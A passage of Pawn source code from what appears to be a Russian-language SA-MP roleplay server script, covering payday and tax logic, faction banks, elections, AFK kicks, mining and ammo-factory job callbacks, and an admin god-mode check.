format(str, sizeof(str), "№%i - Прислал: %s\n",i, AdvertInfo[i][full][aName]);
strcat(str2, str);}
if(TOTALADVERT[full] == 0) return ShowPlayerDialog(playerid, D_NULL, 0, "Объявления", "Новых объявлений нет", "Назад", "");
ShowPlayerDialog(playerid, D_NMENU+5, 2, "Объявления", str2, "Принять", "Отмена");
return true;}
//==============================================================================
stock FuelEnter(playerid){
new i = GetPVarInt(playerid, "PlayerBizz");
if(BizzInfo[i][bProduct] >= 49800) return SendClientMessage(playerid, COLOR_GREY, "Ваш бизнес не нуждается в топливе!");
return ShowPlayerDialog(playerid, D_JOB+125, 1, "Топливо", "{ffffff}Введите кол-во литров топлива и оплату (через запятую):\n\nНа {8d8dff}1{ffffff} литр топлива приходится {8d8dff}1{ffffff} доллара\n\n", "Принять", "Отмена");}
//==============================================================================
stock BankFracEnter(playerid){
new bank;
if(PlayerInfo[playerid][pMember] == F_GROVE) bank = FracBank[0];
if(PlayerInfo[playerid][pMember] == F_BALLAS) bank = FracBank[1];
if(PlayerInfo[playerid][pMember] == F_RIFA) bank = FracBank[2];
if(PlayerInfo[playerid][pMember] == F_AZTECAS) bank = FracBank[3];
if(PlayerInfo[playerid][pMember] == F_VAGOS) bank = FracBank[4];
if(PlayerInfo[playerid][pMember] == F_YAKUZA) bank = FracBank[5];
if(PlayerInfo[playerid][pMember] == F_LCN) bank = FracBank[6];
if(PlayerInfo[playerid][pMember] == F_RM) bank = FracBank[7];
if(PlayerInfo[playerid][pMember] == F_UNITEDNEWS) bank = FracBank[8];
if(PlayerInfo[playerid][pMember] == F_CASINO) bank = FracBank[11];
format(totalstring, 256, "Вывести средства из банка организации\nВвод средств в банк организации\nВ банке организации: %i долларов", bank);
ShowPlayerDialog(playerid, D_JOB+131, 2, "Банк", totalstring, "Принять", "Отмена");
return true;}
//==============================================================================
stock FuelList(playerid){
new str[90], str2[512];
for(new i = 1; i <= TOTALFUEL; i++){
format(str, sizeof(str), "№%i - Заказал: %s\n",i, FuelInfo[i][pName]);
strcat(str2, str);}
if(TOTALFUEL == 0) return ShowPlayerDialog(playerid, D_NULL, 0, "Заказы", "Новых заказов нет", "Закрыть", "");
ShowPlayerDialog(playerid, D_JOB+126, 2, "Заказы заправок", str2, "Принять", "Отмена");
return true;}
//==============================================================================
stock ProductList(playerid){
new str[90], str2[512];
for(new i = 1; i <= TOTALPRODUCT; i++){
format(str, sizeof(str), "№%i - Заказал: %s\n",i, ProductInfo[i][pName]);
strcat(str2, str);}
if(TOTALPRODUCT == 0) return ShowPlayerDialog(playerid, D_NULL, 0, "Заказы", "Новых заказов нет", "Закрыть", "");
ShowPlayerDialog(playerid, D_HEAL+23, 2, "Заказы", str2, "Принять", "Отмена");
return true;}
//==============================================================================
stock GetPick(playerid){
new str[256], srrt[256], full = 0;
for(new i = 0; i < 7; i++){
if(strcmp(PickName[i],"None",false)){
format(str, sizeof(str), "{ffffff}Кандидат №%i - {33AAFF}%s {ffffff}(Голосов: {33AAFF}%d{ffffff})\n",i+1, PickName[i], PickTime[i]);
strcat(srrt, str);
full++;}}
if(full == 0) strcat(srrt, "Кандидатов нет");
ShowPlayerDialog(playerid, D_NULL, 0, "Выборы", srrt, "Закрыть", "");
return true;}
//==============================================================================
stock ResetPick(){
for(new i; i < MAX_PLAYERS; i++){
if(!IsPlayerConnected(i)) continue;
PlayerInfo[i][pPick] = 0;}
mysql_query("UPDATE "TABLE_ACCOUNT" SET pick = '0'");
mysql_query("UPDATE "TABLE_MAYOR" SET pick = '0'");
Pick = false;
PickDate = 0;
return true;}
//==============================================================================
stock SetPosInShop(playerid){
SetPlayerPos(playerid,616.1683,-124.3003,997.9922);
SetPlayerFacingAngle(playerid,101.9068);
SetPlayerInterior(playerid,3);
SetPlayerVirtualWorld(playerid,playerid);
TogglePlayerControllable(playerid,false);
pPressed[playerid]=0;
LinkVehicleToInterior(veh[playerid],3);
SetVehicleVirtualWorld(veh[playerid],playerid);
TextDrawShowForPlayer(playerid,VehNazv[playerid]);
TextDrawShowForPlayer(playerid,VehCost[playerid]);
TextDrawShowForPlayer(playerid,PressH);
TextDrawShowForPlayer(playerid,PressA);
TextDrawShowForPlayer(playerid,PressD);
TextDrawShowForPlayer(playerid,PressC);
TextDrawShowForPlayer(playerid,PressB);
TextDrawShowForPlayer(playerid,VehBox);
PutPlayerInVehicle(playerid,veh[playerid],0);}
//==============================================================================
stock GetExp(playerid){
printf("GETEXP %d",playerid);
PlayerInfo[playerid][pExp]++;
PlayerInfo[playerid][pTime]++;
if(PlayerInfo[playerid][pExp] >= PlayerInfo[playerid][pLevel]*8){
SendClientMessage(playerid, TEAM_BLUE_COLOR, "Поздравляем, вы перешли на следующий уровень!");
PlayerInfo[playerid][pLevel]++;
PlayerInfo[playerid][pExp] = 0;
SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);}
if(PlayerInfo[playerid][pLevel] == 3 && PlayerInfo[playerid][pExp] == 1){
if(!strcmp(PlayerInfo[playerid][pReferal],"None",true)) { }
else{
new money;
format(query, 256, "SELECT * FROM accounts WHERE name = '%s'", PlayerInfo[playerid][pReferal]);
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row_format(query)) mysql_get_field("refmoney", var); money = strval(var);
mysql_free_result();
money+=25000;
format(query,256, "UPDATE "TABLE_ACCOUNT"  SET refmoney = %i WHERE name = '%s'",money, PlayerInfo[playerid][pReferal]);
mysql_query(query);}}
printf("GETEXP %d",playerid);
return true;}
//==============================================================================
stock PayDay(playerid){
new heap = heapspace();
printf("PayDay() STK %d", heap);
new checks,t, htax;
if(PlayerInfo[playerid][pCheckTime] >= 1200 && IsTheMember(PlayerInfo[playerid][pMember])){
if(PlayerInfo[playerid][pMember] <= F_HOSPITAL) checks = GetFractionPrice(TaxFraction[PlayerInfo[playerid][pMember]],FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]);
else checks = GetFractionPrice(TaxFraction[6],FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]);}
printf("PayDay1: ID:%d", playerid);
new tax = Tax*checks/100;
if(Exchequer < checks) checks=0,tax=0,t=1;
Exchequer+=tax;
Exchequer-=checks;
format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
mysql_query(query);
printf("PayDay2: ID:%d", playerid);
PlayerInfo[playerid][pPayCheck] += checks;
SendClientMessage(playerid, COLOR_WHITE, "\tБАНКОВСКИЙ ЧЕК");
SendClientMessage(playerid, COLOR_WHITE, "______________________________");
SendMes(playerid, COLOR_WHITE, " Зарплата : %d долларов ",PlayerInfo[playerid][pPayCheck]);
SendMes(playerid, COLOR_WHITE, " Комиссия: %d долларов ", tax);
new i = GetPVarInt(playerid, "PlayerHouse");
if(GetPlayerHouse(playerid)){
if(!strcmp("E",HouseInfo[i][hDiscript],true)) htax = 50;
if(!strcmp("D",HouseInfo[i][hDiscript],true)) htax = 100;
if(!strcmp("C",HouseInfo[i][hDiscript],true)) htax = 150;
if(!strcmp("B",HouseInfo[i][hDiscript],true)) htax = 200;
if(!strcmp("A",HouseInfo[i][hDiscript],true)) htax = 250;
if(!strcmp("L",HouseInfo[i][hDiscript],true)) htax = 300;
SendMes(playerid, COLOR_WHITE, "Оплата за дом составляет %d долларов",htax);
PlayerInfo[playerid][pBank] -= htax;}
if(GetPlayerBizz(playerid) == 1){
SendMes(playerid, COLOR_WHITE, " Оплата за аренду бизнеса: %d долларов ", BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bBuyPrice] / 1000);
PlayerInfo[playerid][pBank] -=  BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bBuyPrice] / 1000;}
PlayerInfo[playerid][pBank] += PlayerInfo[playerid][pPayCheck] - tax;
SendMes(playerid, COLOR_WHITE, " Теперь в банке: %d долларов ", PlayerInfo[playerid][pBank]);
SendClientMessage(playerid, COLOR_WHITE, "______________________________");
PlayerInfo[playerid][pPayCheck] = 0;
PlayerInfo[playerid][pZakon]++;
if(GetPVarInt(playerid, "GetHome") > 0){
SendClientMessage(playerid, COLOR_YELLOW, "[КВИТАНЦИЯ] Вы забыли оплатить за кварплату, ваш дом продали!");
SendClientMessage(playerid, COLOR_YELLOW, "[КВИТАНЦИЯ] На ваш банковский счет возвращена стоимость дома по гос-ву");
if(GetPVarInt(playerid,"PlayerCar") > 0){
DestroyVehicle(GetPVarInt(playerid,"PlayerCar"));
DeletePVar(playerid,"PlayerCar");}
DeletePVar(playerid, "GetHome");}
printf("PayDay4: ID:%d", playerid);
if(GetPVarInt(playerid, "_GetBizz_") > 0){
if(GetPlayerBizz(playerid) == 1){
SendClientMessage(playerid, COLOR_YELLOW, "[НАЛОГОВАЯ СЛУЖБА] Ваш бизнес был закрыт по причине: отсутствие продуктов или отсутствие лицензии");
SendClientMessage(playerid, COLOR_YELLOW, "[НАЛОГОВАЯ СЛУЖБА] Если по истечению {ffffff}12 {FF6347}часов бизнес будет закрыт, он будет продан гос-ву");
DeletePVar(playerid, "_GetBizz_");}}
printf("PayDay5: ID:%d", playerid);
if(GetPVarInt(playerid, "GetBizz_") > 0 && GetPVarInt(playerid, "_GetBizz_") == 0){
if(GetPlayerBizz(playerid) == 1){
SendMes(playerid, COLOR_YELLOW, "[НАПОМИНАНИЕ] Ваш бизнес закрыт уже {ffffff}%i {FF6347}час(а)",BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bLockTime]);
SendClientMessage(playerid, COLOR_YELLOW, "[НАПОМИНАНИЕ] Если по истечению {ffffff}12 {FF6347}часов бизнес будет закрыт, он будет продан гос-ву");
DeletePVar(playerid, "GetBizz_");}}
if(GetPVarInt(playerid, "GetBizz") > 0){
SendClientMessage(playerid, COLOR_YELLOW,"[НАЛОГОВАЯ СЛУЖБА] Ваш бизнес закрыли в связи с нехваткой ресурсов");
SendClientMessage(playerid, COLOR_YELLOW,"[НАЛОГОВАЯ СЛУЖБА] Бюджет бизнеса зачислен на ваш банковский счет");
DeletePVar(playerid, "GetBizz");}
printf("PayDay6: ID:%d", playerid);
if(t==1) return t=0,SendClientMessage(playerid, COLOR_LIGHTRED, "В казне недостаточно средств!");
if(PlayerInfo[playerid][pCheckTime] < 1200 && IsTheMember(PlayerInfo[playerid][pMember])) SendClientMessage(playerid, COLOR_LIGHTRED, "Чтобы получить зарплату, необходимо отыграть на сервере 20 минут!");
else if(PlayerInfo[playerid][pCheckTime] > 1200 && IsTheMember(PlayerInfo[playerid][pMember])) PlayerInfo[playerid][pCheckTime]-=1200;
PlayerPlaySound(playerid,5203,0.0,0.0,0.0);
printf("PayDayEnd: ID:%d", playerid);
printf("PayDay() STK %d (%d LOSS)", heapspace(), (heap - heapspace()));
return true;}
//==============================================================================
stock GlobalAfkCheck(){
for(new i; i != MAX_PLAYERS; i++){
if(!IsPlayerConnected(i)) continue;
if(GetPVarInt(i,"AFK_Tick") > 10000){
SetPVarInt(i,"AFK_Tick",1);
SetPVarInt(i,"AFK_Check",0);}
if(GetPVarInt(i,"AFK_Use") == 1 && GetPVarInt(i, "AFK_Time") <= 2){
GetPlayerPos(i,PlayerInfo[i][pPos_x],PlayerInfo[i][pPos_y],PlayerInfo[i][pPos_z]);
SetPVarInt(i,"AFK_Use",0);}
if(GetPVarInt(i,"AFK_Check") < GetPVarInt(i,"AFK_Tick") && GetPlayerState(i)){
SetPVarInt(i,"AFK_Check",GetPVarInt(i,"AFK_Tick"));
SetPVarInt(i,"AFK_Time",0);}
if(GetPVarInt(i,"AFK_Check") == GetPVarInt(i,"AFK_Tick") && GetPlayerState(i)){
SetPVarInt(i,"AFK_Time",GetPVarInt(i,"AFK_Time") + 1);
if(GetPVarInt(i, "AFK_Time") > 2){
new CB[32];
Convert(GetPVarInt(i,"AFK_Time")-2,CB);
strins(CB,"AFK: ",0);
SetPlayerChatBubble(i,CB,0x33CCFFFF,50.0,1200);
SetPVarInt(i,"AFK_Use",1);}}
if(GetPVarInt(i,"AFK_Time") >= 900){
SendClientMessage(i,COLOR_LIGHTRED, "Вы были кикнуты. Причина: Долгое прибывание в AFK ");
GKick(i);}}}
//==============================================================================
onereal_function: FunctionsTimer(playerid,functi)
{
  switch(functi)
  {
	case 0: return true;
	case 1:
	{
	   for(new o; o < 18; o++)
	   {
	     send(playerid, "");
	   }
	   SendClientMessage(playerid, 0xAA3333AA, "Загрузка сервера.");
	   SetTimerEx("FunctionsTimer", 1000, false, "id", playerid,2);
	}
	case 2:
	{
	   for(new o; o < 18; o++)
	   {
	     send(playerid, "");
	   }
	   SendClientMessage(playerid, 0xAA3333AA, "Загрузка сервера..");
       SetTimerEx("FunctionsTimer", 1000, false, "id", playerid,3);
	}
	case 3:
	{
	   for(new o; o < 18; o++)
	   {
	     send(playerid, "");
	   }
       SendClientMessage(playerid, 0xAA3333AA, "Загрузка сервера...");
       SetTimerEx("FunctionsTimer", 1000, false, "id", playerid,4);
	}
	case 4:
	{
	   for(new o; o < 18; o++)
	   {
	     send(playerid, "");
	   }
       SendClientMessage(playerid, 0xAA3333AA, "Загрузка сервера успешно...");
   	   ShowLogin(playerid);
	}
  }
  return true;
}
forward Stol1(playerid);
public Stol1(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol2(playerid);
public Stol2(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol3(playerid);
public Stol3(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 1,1,1);
	return 1;}
forward Stol4(playerid);
public Stol4(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol5(playerid);
public Stol5(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	DestroyObject(Objectbox[playerid]);
	return 1;}
forward Stol6(playerid);
public Stol6(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DestroyObject(Objectbox[playerid]);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol7(playerid);
public Stol7(playerid){
    TogglePlayerControllable(playerid,true);
	DestroyObject(Objectbox[playerid]);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol8(playerid);
public Stol8(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol9(playerid);
public Stol9(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	DestroyObject(Objectbox[playerid]);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Stol10(playerid);
public Stol10(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 1;
	pMet[playerid] = 0;
	DestroyObject(Objectbox[playerid]);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	SendClientMessage(playerid,0x00FF00FF,"Теперь отнесите готовые патроны на стол, для упаковки.");
	SetPlayerAttachedObject(playerid, 4, 3013, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak1(playerid);
public Verstak1(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	DestroyObject(Objectbox[playerid]);
	pPatr[playerid] = 1;
	pBoxobdel[playerid] = 2;
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak2(playerid);
public Verstak2(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
	pBoxobdel[playerid] = 2;
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	DestroyObject(Objectbox[playerid]);
	pPatr[playerid] = 1;
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak3(playerid);
public Verstak3(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
	pBoxobdel[playerid] = 2;
	DestroyObject(Objectbox[playerid]);
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	pPatr[playerid] = 1;
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak4(playerid);
public Verstak4(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
	pBoxobdel[playerid] = 2;
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	pPatr[playerid] = 1;
	DestroyObject(Objectbox[playerid]);
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak5(playerid);
public Verstak5(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	pPatr[playerid] = 1;
	DestroyObject(Objectbox[playerid]);
	pBoxobdel[playerid] = 2;
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward Verstak6(playerid);
public Verstak6(playerid){
    TogglePlayerControllable(playerid,true);
	pObdelbox[playerid] = 0;
	CP[playerid] = 5;
    pPatr[playerid] = 1;
    pBoxobdel[playerid] = 2;
	SetPlayerCheckpoint(playerid,2533.8335,-1300.9110,1044.1250,2.0);
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 1, 1);
	DeleteObject(playerid);
	DestroyObject(Objectbox[playerid]);
	SendClientMessage(playerid,0x00FF00FF,"Вы собрали ящик патронов, отнесите его на склад");
	SetPlayerAttachedObject(playerid, 4, 2358, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 1,1,1);
	return 1;}
forward UpdateShaht();
public UpdateShaht(){
    new Zavodstring[512]; //инфо склада завода
    new shahtstr[512];
    format(shahtstr,sizeof(shahtstr),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Metall);
    Update3DTextLabelText(skladik, 0xFFFFFFFF, shahtstr);
    format(Zavodstring,sizeof(Zavodstring),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Zavodz);
    Update3DTextLabelText(skladik1, 0xFFFFFFFF, Zavodstring);
    format(Zavodstring,sizeof(Zavodstring),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Zavodz);
    Update3DTextLabelText(skladik2, 0xFFFFFFFF, Zavodstring);
    format(shahtstr,sizeof(shahtstr),"{FFBE00}Ящиков с патронами на складе:{FFFFFF}\n{7CFC00}%d",Patronbox);
    Update3DTextLabelText(patron3D, 0xFFFFFFFF, shahtstr);
    return 1;}
forward UpdateShahtStart();
public UpdateShahtStart(){
    new shahtstr[512];
   	format(shahtstr,sizeof(shahtstr),"{00EBFF}Металла на складе:{FFFFFF}\n{7CFC00}%d кг",Metall);
    Update3DTextLabelText(skladik, 0xFFFFFFFF, shahtstr);
	return 1;}
forward Ruda1(playerid);
forward Ruda2(playerid);
forward Ruda3(playerid);
public Ruda1(playerid){
	KillTimer(shahter);
	Samorodok[playerid] = 1;
	Ruda[playerid] = 1;
	CP[playerid] = 3;
	SetPlayerCheckpoint(playerid,-449.8198,1440.9951,20.9651,2);
	ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,0,0,1,5150);
	SetPlayerAttachedObject(playerid,2, 1458, 1, -1.034844, 1.116571, -0.065124, 76.480148, 75.781570, 280.952545, 0.575599, 0.604554, 0.624122);// Дали телегу с камнем
	SetPlayerAttachedObject(playerid,3, 905, 1, -0.275758, 1.305280, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);// Дали камень
    //TogglePlayerControllable(playerid,true);
	return 1;}
public UpdateBeg(playerid){
	begi[playerid] = 0;
	return 1;}
forward Legi1(playerid);
public Legi1(playerid){
	KillTimer(leg);
    SetPlayerPos(playerid,30.2415,-136.8975,1002.0429);
	SetPlayerFacingAngle(playerid,90.6140);
 	TogglePlayerControllable(playerid,true);
 	SetHealth(playerid, 100);
  	SendClientMessage(playerid, COLOR_WHITE, "Курс лечения окончен.");
   	SetCameraBehindPlayer(playerid);
   	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 1);
   	legi[playerid] = 0;
	vrag[playerid] = 0;
	return 1;}
public Ruda2(playerid){
	KillTimer(shahter);
	Samorodok[playerid] = 1;
	Ruda[playerid] = 2;
	CP[playerid] = 3;
	SetPlayerCheckpoint(playerid,-449.8198,1440.9951,20.9651,2);
	ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,0,0,1,5150);
	SetPlayerAttachedObject(playerid,2, 1458, 1, -1.034844, 1.116571, -0.065124, 76.480148, 75.781570, 280.952545, 0.575599, 0.604554, 0.624122);// Дали телегу с камнем
	SetPlayerAttachedObject(playerid,3, 905, 1, -0.275758, 1.305280, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);// Дали камень
    //TogglePlayerControllable(playerid,true);
	return 1;}
public Ruda3(playerid){
	KillTimer(shahter);
	Samorodok[playerid] = 1;
	Ruda[playerid] = 3;
	CP[playerid] = 3;
	SetPlayerCheckpoint(playerid,-449.8198,1440.9951,20.9651,2);
	ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,0,0,1,5150);
	SetPlayerAttachedObject(playerid,2, 1458, 1, -1.034844, 1.116571, -0.065124, 76.480148, 75.781570, 280.952545, 0.575599, 0.604554, 0.624122);// Дали телегу с камнем
	SetPlayerAttachedObject(playerid,3, 905, 1, -0.275758, 1.305280, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);// Дали камень
    //TogglePlayerControllable(playerid,true);
	return 1;}
forward VzvehUpdate(playerid);
public VzvehUpdate(playerid){
	new s1[512];
    new s2[512];
    new s3[512];
    new s4[512];
    new s5[512];
	Delete3DTextLabel(vodzveh[0]);
	Delete3DTextLabel(vodzveh[1]);
	Delete3DTextLabel(vodzveh[2]);
	Delete3DTextLabel(vodzveh[3]);
	Delete3DTextLabel(vodzveh[4]);
	format(s1, sizeof(s1),"Загружено\n{ffa500}%d/500 кг",Vzveh[zveh[0]]);
	vodzveh[0] = Create3DTextLabel(s1,0x0FFF00FF,1.0,1.0,1.0,10,0,1);
	Attach3DTextLabelToVehicle(vodzveh[0], zveh[0], 0.0, 0.0, 0.0);
	format(s2, sizeof(s2),"Загружено\n{ffa500}%d/500 кг",Vzveh[zveh[1]]);
	vodzveh[1] = Create3DTextLabel(s2,0x0FFF00FF,1.0,1.0,1.0,10,0,1);
	Attach3DTextLabelToVehicle(vodzveh[1], zveh[1], 0.0, 0.0, 0.0);
	format(s3, sizeof(s3),"Загружено\n{ffa500}%d/500 кг",Vzveh[zveh[2]]);
	vodzveh[2] = Create3DTextLabel(s3,0x0FFF00FF,1.0,1.0,1.0,10,0,1);
	Attach3DTextLabelToVehicle(vodzveh[2], zveh[2], 0.0, 0.0, 0.0);
	format(s4, sizeof(s4),"Загружено\n{ffa500}%d/500 кг",Vzveh[zveh[3]]);
	vodzveh[3] = Create3DTextLabel(s4,0x0FFF00FF,1.0,1.0,1.0,10,0,1);
	Attach3DTextLabelToVehicle(vodzveh[3], zveh[3], 0.0, 0.0, 0.0);
	format(s5, sizeof(s5),"Загружено\n{ffa500}%d/500 кг",Vzveh[zveh[4]]);
	vodzveh[4] = Create3DTextLabel(s5,0x0FFF00FF,1.0,1.0,1.0,10,0,1);
	Attach3DTextLabelToVehicle(vodzveh[4], zveh[4], 0.0, 0.0, 0.0);
	return 1;}
forward ZavodVeh(carid);
public ZavodVeh(carid){
    if((carid == zveh[0]) || (carid == zveh[1]) || (carid == zveh[2]) || (carid == zveh[3]) || (carid == zveh[4])){
        return 1;}return 0;}
forward Gmtest(playerid);
public Gmtest(playerid){
    new string[128], Float:nowhealth[MAX_PLAYERS];
    if(AdmGM[AdmGMID[playerid]] == 1){
        GetPlayerHealth(AdmGMID[playerid],nowhealth[AdmGMID[playerid]]);}
    if((AdmGMHP[AdmGMID[playerid]]-nowhealth[AdmGMID[playerid]]) > 0){
        format(string, sizeof(string), "До: \t\t\t\t%.0f.0 HP\nПосле: \t\t\t%.0f.0 HP\nHP уменьшилось на: \t\t%.0f.0\n\n{7FB151}ГМ не обнаружено. HP игрока восстановлено.",AdmGMHP[AdmGMID[playerid]],nowhealth[AdmGMID[playerid]],(AdmGMHP[AdmGMID[playerid]]-nowhealth[AdmGMID[playerid]]));
        ShowPlayerDialog(playerid,888,DIALOG_STYLE_MSGBOX  , "Проверка на God Mode",string, "Закрыть", "");
